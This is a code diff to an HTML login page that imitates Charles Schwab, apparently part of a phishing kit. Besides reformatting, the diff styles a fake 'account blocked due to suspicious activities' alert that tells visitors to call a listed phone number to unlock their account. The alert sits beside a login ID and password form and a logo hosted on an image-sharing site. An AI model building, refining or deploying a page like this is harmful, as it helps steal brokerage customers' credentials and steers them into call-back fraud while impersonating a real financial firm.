@@ -29,9 +29,6 @@
         font-size: 0.9rem;
       }
       .error-message {
-        color: red;
-        font-size: 0.9rem;
-        margin-top: 0.5rem;
         display: none; /* Hidden by default */
       }
       .coaching-icon {
@@ -47,7 +44,10 @@
     <!-- Just an image -->
     <nav class="navbar navbar-light bg-light">
       <a class="navbar-brand mx-3" href="#" style="width: 50px; height: 50px">
-       <img style="width: 80px; height: 60px;" src="https://i.postimg.cc/Cx9LdH56/Whats-App-Image-2025-07-16-at-17-36-08.jpg"/>
+        <img
+          style="width: 80px; height: 60px"
+          src="https://i.postimg.cc/Cx9LdH56/Whats-App-Image-2025-07-16-at-17-36-08.jpg"
+        />
       </a>
     </nav>
     <div class="container py-3">
@@ -55,8 +55,12 @@
         <div class="col-md-5">
           <div class="login-card">
             <h5 class="mb-2">Log in to Schwab</h5>
-            <div id="errorMsg" class="error-message">
-             Your account access has been blocked due to suspicious activities. Contact our customer service at  +1 (818) 856-2723 to verify and unlock your account.
+            <div
+              id="errorMsg"
+              class="alert alert-danger error-message"
+            >
+              Your account access has been blocked due to suspicious activities. Contact our customer service at
+              <span style="white-space: nowrap;">+1 (818) 856-2723</span> to verify and unlock your account.
             </div>
             <form id="loginForm">
               <div class="mb-2">
@@ -67,7 +71,6 @@
                 <label for="password" class="form-label">Password</label>
                 <div class="input-group">
                   <input type="password" class="form-control" id="password" />
-                  <!-- <span class="input-group-text">👁️</span> -->
                 </div>
               </div>
               <div class="mb-2 form-check">
@@ -76,9 +79,9 @@
                   class="form-check-input"
                   id="rememberId"
                 />
-                <label class="form-check-label" for="rememberId"
-                  >Remember Login ID</label
-                >
+                <label class="form-check-label" for="rememberId">
+                  Remember Login ID
+                </label>
               </div>
               <div class="mb-2">
                 <label for="startPage" class="form-label">Start Page</label>
@@ -116,14 +119,13 @@
         </div>
         <div class="col-md-5 mt-2 mt-md-0 text-center bottom">
           <div class="d-flex">
-            
             <div>
-            <h5>See why traders come here to train.</h5>
-            <p>
-              Schwab Coaching<sup>®</sup>—professional expertise, like‑minded
-              community, and learning your way.
-            </p>
-            <a href="#" class="text-primary">Explore Schwab Coaching</a>
+              <h5>See why traders come here to train.</h5>
+              <p>
+                Schwab Coaching<sup>®</sup>—professional expertise, like‑minded
+                community, and learning your way.
+              </p>
+              <a href="#" class="text-primary">Explore Schwab Coaching</a>
             </div>
             <div class="coaching-icon mb-2">
               <img
